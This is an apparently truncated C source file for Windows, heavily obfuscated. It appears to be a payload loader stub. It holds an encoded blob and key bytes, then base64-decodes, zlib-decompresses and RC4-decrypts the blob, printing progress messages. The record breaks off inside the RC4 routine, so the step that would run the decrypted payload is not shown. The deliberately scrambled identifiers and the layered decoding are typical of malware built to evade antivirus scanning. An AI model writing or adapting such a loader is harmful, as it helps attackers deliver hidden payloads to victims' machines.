#include <windows.h>
#include <string.h>
#include <zlib.h>
#include <stdio.h>


unsigned char skpEYVo4jEJrKBjMpUVe8csDD53Ze84Q2BmS6S3i8RTXL4Rbar18RT_vvX7xICksJBuVfMwojvrm_EnbbH37gBAZcjc6zPTQj1ddfmIaRnteLgdRMq8RRG0KQpnfFN_bOQSVoKS7_SyCkzps9ymP6BhCeUUeUxi73Bui7q0d2qOz4JikshM2cmhufiKEFPqps7T9KIh[] = "\x61\x6e\x74\x59\x62\x4b\x43\x58\x50\x43\x50\x57\x51\x74\x79\x58\x43\x30\x30\x65\x30\x44\x58\x48\x51\x70\x4d\x71\x52\x71\x49\x46\x62\x6c\x6b\x63\x6d\x48\x75\x79\x4e\x57\x35\x2f\x37\x63\x4d\x59\x47\x39\x64\x34\x56\x45\x4b\x63\x63\x39\x2b\x48\x6c\x54\x55\x38\x33\x73\x35\x45\x6c\x69\x67\x57\x70\x45\x54\x70\x6e\x59\x48\x38\x49\x55\x6a\x6a\x4b\x46\x31\x52\x71\x63\x64\x32\x4a\x34\x46\x38\x50\x47\x46\x47\x55\x61\x67\x75\x4a\x48\x76\x37\x75\x31\x51\x75\x4e\x32\x37\x46\x74\x4d\x48\x33\x6e\x2f\x64\x76\x42\x37\x72\x5a\x64\x71\x6b\x79\x74\x6c\x48\x50\x4d\x45\x59\x4e\x46\x31\x6d\x46\x77\x44\x57\x58\x50\x6c\x69\x38\x78\x76\x78\x2f\x35\x73\x75\x6a\x37\x4e\x39\x67\x65\x4c\x35\x4e\x39\x78\x74\x56\x35\x33\x48\x38\x52\x50\x47\x5a\x77\x77\x6b\x7a\x5a\x46\x35\x2f\x66\x48\x33\x32\x6f\x4a\x44\x32\x4b\x56\x4e\x6e\x72\x30\x44\x67\x39\x69\x56\x62\x72\x76\x59\x68\x4e\x4f\x4d\x65\x57\x46\x61\x7a\x56\x42\x52\x2f\x39\x4a\x74\x73\x72\x78\x58\x4d\x4a\x55\x4b\x34\x5a\x2b\x6c\x39\x64\x4d\x61\x42\x59\x55\x2f\x42\x2b\x44\x6b\x72\x65\x49\x6d\x44\x63\x42\x4a\x38\x2f\x47\x39\x6b\x33\x74\x66\x4a\x34\x62\x4e\x54\x66\x67\x43\x37\x65\x6d\x54\x35\x2b\x77\x66\x38\x5a\x65\x58\x47\x68\x45\x2f\x43\x46\x62\x71\x31\x45\x30\x36\x4e\x44\x47\x33\x69\x61\x73\x69\x6d\x66\x78\x59\x33\x43\x75\x59\x47\x62\x4f\x39\x75\x33\x58\x56\x4b\x61\x6b\x56\x75\x69\x58\x54\x43\x56\x64\x48\x4c\x74\x2b\x72\x63\x77\x7a\x55\x35\x59\x5a\x51\x51\x4a\x79\x68\x7a\x63\x6f\x46\x45\x61\x66\x53\x47\x7a\x7a\x77\x67\x43\x32\x62\x42\x54\x57\x73\x56\x38\x6a\x46\x78\x68\x51\x55\x3d";
unsigned char ttI7kXHpVcWaPRC8M8gHcfFyspB3dVgGczYadqFMNKrEey0PiERN_THiZuJdYqzNRT3eIOhIGYBFdatX7EJhmug[] = "\x62\xb9\x8c\x96";
unsigned char XT0Aal6vHAjg7duPVYuvvx_xWF0NE0wmm99Iw5MjJNY2QMVLdxLaUb9PSF6K46NAGb2MZcZyz_CygkMfmzoPfz1uyU8jsrEZd_3mlVCFwqa5KRMCnAQVa8gX_HyUwHK8rgc3AaeN73UlX07tzGReLolkXGt37c_0Ihbyr_EOkkQ8Y3uqxSoNP6Vi9XIwdqPV_Tc[] = "\x7b\xb9\x55\x8e\xec\xaa\xff\xd1";
#define KEY_SIZE 1


static const unsigned char h8rZmCxQIfVeKpGSnu40JSq0RkrlFZElR_MGaMVisbYnHxtlv3SlM5vP6ms813KM4S1ySFi4SG6sc3Fu3FtrITFgIVVmVkd1IyKns8_u9Xr9umrlEjg1Ck[256] = {
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};


int a1OPvGmASVoW4J99UxvUM4Y(const unsigned char *rP5u5l9AgyfBZqe_dLEsbpUj8JYKp1fS1fWFHfpV7BOg8L2YXaiySmXIcADTieobGuGNKEYd9w2_P8C3DDhzK9cX6wd8SQgjZCusIDjAtsQ8QkmuqLTIr_F6L, int JGeT7n5Q7nnEFmG0SDzZCZMeYpUM4Pfnnlx5YfP9X2VoD8fNe, unsigned char *epZ0u2ctLuaasB71GpEIvP4qKnKzEkXg3gXK8wASJTdqKAcNJKQiGyg_IOAqmE8bASfgEjIaHOvTjSz3bfQBeqzyq1II4nejKxhm44lg1GCw20jxlDtq1KVtrCSPKwmOnQrSfGSkxWOkZ_IuL9_rd3n1unfZozVkNV8mYVgt5dgdAxIelmGmYcNTffmT0DQTDjyCqdP6vlST) {
    printf("[~] Starting base64 decode\n");
    int pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54, RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B = 0;
    unsigned char ax6IKg266lJRF1IC2nzhfJORwiUxE8MUdfeozA960FjgbwafvfDeR0ZKSngfDwWOeACPAmI4SnIBjGfdRnjsdpE5bs844FW6Mr9JNlaOdZVsOiXj1u, b, c, d;
    
    for (pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 = 0; pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 < JGeT7n5Q7nnEFmG0SDzZCZMeYpUM4Pfnnlx5YfP9X2VoD8fNe; pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 += 4) {
        ax6IKg266lJRF1IC2nzhfJORwiUxE8MUdfeozA960FjgbwafvfDeR0ZKSngfDwWOeACPAmI4SnIBjGfdRnjsdpE5bs844FW6Mr9JNlaOdZVsOiXj1u = h8rZmCxQIfVeKpGSnu40JSq0RkrlFZElR_MGaMVisbYnHxtlv3SlM5vP6ms813KM4S1ySFi4SG6sc3Fu3FtrITFgIVVmVkd1IyKns8_u9Xr9umrlEjg1Ck[rP5u5l9AgyfBZqe_dLEsbpUj8JYKp1fS1fWFHfpV7BOg8L2YXaiySmXIcADTieobGuGNKEYd9w2_P8C3DDhzK9cX6wd8SQgjZCusIDjAtsQ8QkmuqLTIr_F6L[pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54]];
        b = h8rZmCxQIfVeKpGSnu40JSq0RkrlFZElR_MGaMVisbYnHxtlv3SlM5vP6ms813KM4S1ySFi4SG6sc3Fu3FtrITFgIVVmVkd1IyKns8_u9Xr9umrlEjg1Ck[rP5u5l9AgyfBZqe_dLEsbpUj8JYKp1fS1fWFHfpV7BOg8L2YXaiySmXIcADTieobGuGNKEYd9w2_P8C3DDhzK9cX6wd8SQgjZCusIDjAtsQ8QkmuqLTIr_F6L[pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 + 1]];
        c = h8rZmCxQIfVeKpGSnu40JSq0RkrlFZElR_MGaMVisbYnHxtlv3SlM5vP6ms813KM4S1ySFi4SG6sc3Fu3FtrITFgIVVmVkd1IyKns8_u9Xr9umrlEjg1Ck[rP5u5l9AgyfBZqe_dLEsbpUj8JYKp1fS1fWFHfpV7BOg8L2YXaiySmXIcADTieobGuGNKEYd9w2_P8C3DDhzK9cX6wd8SQgjZCusIDjAtsQ8QkmuqLTIr_F6L[pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 + 2]];
        d = h8rZmCxQIfVeKpGSnu40JSq0RkrlFZElR_MGaMVisbYnHxtlv3SlM5vP6ms813KM4S1ySFi4SG6sc3Fu3FtrITFgIVVmVkd1IyKns8_u9Xr9umrlEjg1Ck[rP5u5l9AgyfBZqe_dLEsbpUj8JYKp1fS1fWFHfpV7BOg8L2YXaiySmXIcADTieobGuGNKEYd9w2_P8C3DDhzK9cX6wd8SQgjZCusIDjAtsQ8QkmuqLTIr_F6L[pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 + 3]];
        
        epZ0u2ctLuaasB71GpEIvP4qKnKzEkXg3gXK8wASJTdqKAcNJKQiGyg_IOAqmE8bASfgEjIaHOvTjSz3bfQBeqzyq1II4nejKxhm44lg1GCw20jxlDtq1KVtrCSPKwmOnQrSfGSkxWOkZ_IuL9_rd3n1unfZozVkNV8mYVgt5dgdAxIelmGmYcNTffmT0DQTDjyCqdP6vlST[RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B++] = (ax6IKg266lJRF1IC2nzhfJORwiUxE8MUdfeozA960FjgbwafvfDeR0ZKSngfDwWOeACPAmI4SnIBjGfdRnjsdpE5bs844FW6Mr9JNlaOdZVsOiXj1u << 2) | (b >> 4);
        if (c != 64) epZ0u2ctLuaasB71GpEIvP4qKnKzEkXg3gXK8wASJTdqKAcNJKQiGyg_IOAqmE8bASfgEjIaHOvTjSz3bfQBeqzyq1II4nejKxhm44lg1GCw20jxlDtq1KVtrCSPKwmOnQrSfGSkxWOkZ_IuL9_rd3n1unfZozVkNV8mYVgt5dgdAxIelmGmYcNTffmT0DQTDjyCqdP6vlST[RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B++] = (b << 4) | (c >> 2);
        if (d != 64) epZ0u2ctLuaasB71GpEIvP4qKnKzEkXg3gXK8wASJTdqKAcNJKQiGyg_IOAqmE8bASfgEjIaHOvTjSz3bfQBeqzyq1II4nejKxhm44lg1GCw20jxlDtq1KVtrCSPKwmOnQrSfGSkxWOkZ_IuL9_rd3n1unfZozVkNV8mYVgt5dgdAxIelmGmYcNTffmT0DQTDjyCqdP6vlST[RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B++] = (c << 6) | d;
    }
    printf("[+] Base64 decode completed: %d bytes\n", RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B);
    return RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B;
}


int wXyPBuf4OjUCftNqFlrEfQ0jLUd2jTCL29D7synW9dx3G4w1VMIahiF0AjAziY8hXELoQ7t4USvSXjLO_aUqPlAOD1sH8N3uC5QD45XtpVxs3r1QyRCwT6iiPkdm_0yoAr3e1JoixyC4TMfc3iAM2SF7efmn7218nqvntvmiCtMnk7ny4ClfAhKMJIlfWGYMdJAaObiUXetG19wwRzqebyT0y3axthpd4uj5jD5vk99l(const unsigned char *rP5u5l9AgyfBZqe_dLEsbpUj8JYKp1fS1fWFHfpV7BOg8L2YXaiySmXIcADTieobGuGNKEYd9w2_P8C3DDhzK9cX6wd8SQgjZCusIDjAtsQ8QkmuqLTIr_F6L, int JGeT7n5Q7nnEFmG0SDzZCZMeYpUM4Pfnnlx5YfP9X2VoD8fNe, unsigned char *epZ0u2ctLuaasB71GpEIvP4qKnKzEkXg3gXK8wASJTdqKAcNJKQiGyg_IOAqmE8bASfgEjIaHOvTjSz3bfQBeqzyq1II4nejKxhm44lg1GCw20jxlDtq1KVtrCSPKwmOnQrSfGSkxWOkZ_IuL9_rd3n1unfZozVkNV8mYVgt5dgdAxIelmGmYcNTffmT0DQTDjyCqdP6vlST, int vpM80btCvGMH0q1mfJp7YtzscL1dx5Bd4a22tPGMwQ9Q5mNWxsqe69BNwnIjoQtWy4hzTW6YrACITsDERpu9y77D48WrKix4ZV1u7wBM5wvYl4sNQbMOg_kqYrbYkUMS_wTfOnG6BPfZHvqPutyoGUUyh7blLWk0PRUt1farF2pJQn5yInsdtvw51adPn) {
    printf("[~] Starting zlib decompression\n");
    uLongf dest_len = (uLongf)vpM80btCvGMH0q1mfJp7YtzscL1dx5Bd4a22tPGMwQ9Q5mNWxsqe69BNwnIjoQtWy4hzTW6YrACITsDERpu9y77D48WrKix4ZV1u7wBM5wvYl4sNQbMOg_kqYrbYkUMS_wTfOnG6BPfZHvqPutyoGUUyh7blLWk0PRUt1farF2pJQn5yInsdtvw51adPn;
    int LVLXDFXEuW6PV33HU6JJ6_7XKdnkThjHVOqtV_P0Y9pGI8YHsMUiHEc8uuDW0R0MtOtcAIIOmSGKXF8NIhDKChKoZMiT0FRRxVG0jmIM2d53qpYJLl753s4mrZNpeULgCz9sx8PP_erWCelVC1kntn_DWGqiPPD6VwRVSdgXAaOCyoQMNljqWGkCZhgbSBNzByD75WZn2m8JTLRbXt7Aluld4uRnHuOWYUO = uncompress(epZ0u2ctLuaasB71GpEIvP4qKnKzEkXg3gXK8wASJTdqKAcNJKQiGyg_IOAqmE8bASfgEjIaHOvTjSz3bfQBeqzyq1II4nejKxhm44lg1GCw20jxlDtq1KVtrCSPKwmOnQrSfGSkxWOkZ_IuL9_rd3n1unfZozVkNV8mYVgt5dgdAxIelmGmYcNTffmT0DQTDjyCqdP6vlST, &dest_len, rP5u5l9AgyfBZqe_dLEsbpUj8JYKp1fS1fWFHfpV7BOg8L2YXaiySmXIcADTieobGuGNKEYd9w2_P8C3DDhzK9cX6wd8SQgjZCusIDjAtsQ8QkmuqLTIr_F6L, (uLong)JGeT7n5Q7nnEFmG0SDzZCZMeYpUM4Pfnnlx5YfP9X2VoD8fNe);
    
    if (LVLXDFXEuW6PV33HU6JJ6_7XKdnkThjHVOqtV_P0Y9pGI8YHsMUiHEc8uuDW0R0MtOtcAIIOmSGKXF8NIhDKChKoZMiT0FRRxVG0jmIM2d53qpYJLl753s4mrZNpeULgCz9sx8PP_erWCelVC1kntn_DWGqiPPD6VwRVSdgXAaOCyoQMNljqWGkCZhgbSBNzByD75WZn2m8JTLRbXt7Aluld4uRnHuOWYUO != Z_OK) {
        printf("[x] Zlib decompression failed: error %d\n", LVLXDFXEuW6PV33HU6JJ6_7XKdnkThjHVOqtV_P0Y9pGI8YHsMUiHEc8uuDW0R0MtOtcAIIOmSGKXF8NIhDKChKoZMiT0FRRxVG0jmIM2d53qpYJLl753s4mrZNpeULgCz9sx8PP_erWCelVC1kntn_DWGqiPPD6VwRVSdgXAaOCyoQMNljqWGkCZhgbSBNzByD75WZn2m8JTLRbXt7Aluld4uRnHuOWYUO);
        return 0;
    }
    
    printf("[+] Zlib decompression completed: %d bytes\n", (int)dest_len);
    return (int)dest_len;
}


typedef struct {
    unsigned char lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[256];
    unsigned char pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54;
    unsigned char RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B;
} AdbqFf1X1bmyctvndoVoauLvqNPYxGDCokhCZhxBN9oSd;


void ElFIpsBNwribGmv5hhz42TopG8LQZOnERxX5_XHgU2uSy0Ccuf(AdbqFf1X1bmyctvndoVoauLvqNPYxGDCokhCZhxBN9oSd *st, const unsigned char *key, int CXKfaD5fcKY8f0K7IB) {
    int pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54, RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B = 0;
    unsigned char tgTy_wCrRNDhAE_8CIUeGFxG_EtxKUZFP4sDXe2fI;
    
    for (pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 = 0; pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 < 256; pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54++) st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54] = (unsigned char)pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54;
    st->pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 = 0;
    st->RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B = 0;
    
    for (pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 = 0; pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 < 256; pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54++) {
        RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B = (RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B + st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54] + key[pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 % CXKfaD5fcKY8f0K7IB]) % 256;
        tgTy_wCrRNDhAE_8CIUeGFxG_EtxKUZFP4sDXe2fI = st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54];
        st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54] = st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B];
        st->lavwk6nV2nSHTp_RYzVJi35ZgfyMgaRGEktSl6JBianot9IQxeE03B2fu8KCEooKGlVtxDggI[RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B] = tgTy_wCrRNDhAE_8CIUeGFxG_EtxKUZFP4sDXe2fI;
    }
    st->pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 = 0;
    st->RNQAohq6EkcoxHhhoAsgDE9VsNPgqmeTkqEYQkLWFeEgCuXA52oXh2YOle0aQFAnc2NWpRD2StMfABoOOiefeq5K6wdBVJapA6iMw4xr4yEAAR4VoM5doKPmmkK5icxTNgFuj1JYYogG_mxizkKkH3g52Z7j_gT28B = 0;
}


void FbFCf7PeqmTblxEWfN5kxl8Ed6zybqV_Dub4IALSZrmC92Xm5d6sINAvg2lSeK2ozZsQNHQewNhVA6xDrW0oZQSAtuKZG8ETXxfSSY5Ed5CwVAVxh74JvdSo_r5HsMu7Ahi0la5XoFd4FWQMEYT3j9uf6A21Q2vShOFjkuyxmIxSw0hFi_tBwiY8Q8T9zikx(AdbqFf1X1bmyctvndoVoauLvqNPYxGDCokhCZhxBN9oSd *st, unsigned char *P24r8E3ZfFF7Zo0lfhxeKe4gfF4bU0rz1NRnb_iTLv74qVFvp0arAPspE5rWyDCt2rWGcBx5ugz7U5qntDEM5Mru8YmjqqhnHT4AzMHx_4ROrizceDC9dq1Y1lrkIj3zRImoOl464RbbCgWfD5wdsGSj2_syuTYPkM4Hm7xBRutoC, int qd244u_YEpOT_ZSMo9_UXFBOMvjk466S4X3Z57zDy41TC2yVR7hF9I5wB9djYxzOgHerNOmdMyWlzdIsY2ogqD5Lf2PlUHAO9WPjYkCCbiJ7djzzpTbwaxtYwPIDmzAYavru90EzLcL2w) {
    int rTeW4IYk53f6EhLmmXE0BxImufXXQ3rPh;
    unsigned char tgTy_wCrRNDhAE_8CIUeGFxG_EtxKUZFP4sDXe2fI, K;
    
    for (rTeW4IYk53f6EhLmmXE0BxImufXXQ3rPh = 0; rTeW4IYk53f6EhLmmXE0BxImufXXQ3rPh < qd244u_YEpOT_ZSMo9_UXFBOMvjk466S4X3Z57zDy41TC2yVR7hF9I5wB9djYxzOgHerNOmdMyWlzdIsY2ogqD5Lf2PlUHAO9WPjYkCCbiJ7djzzpTbwaxtYwPIDmzAYavru90EzLcL2w; rTeW4IYk53f6EhLmmXE0BxImufXXQ3rPh++) {
        st->pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 = (st->pLF10yJAOVrikk0J8_8lj1hQ3XyjWx59aSsrQFGSYaVRA1yfz0C9CSkFZUbVIyLvEfkZaPmpJro5f_FazOiqWyOq_7d660nJ_didAsce2xR8ym7Upkmx_7vsECrcjl8iwLi__EiQ1tSkVX21r54 + 1) % 256;
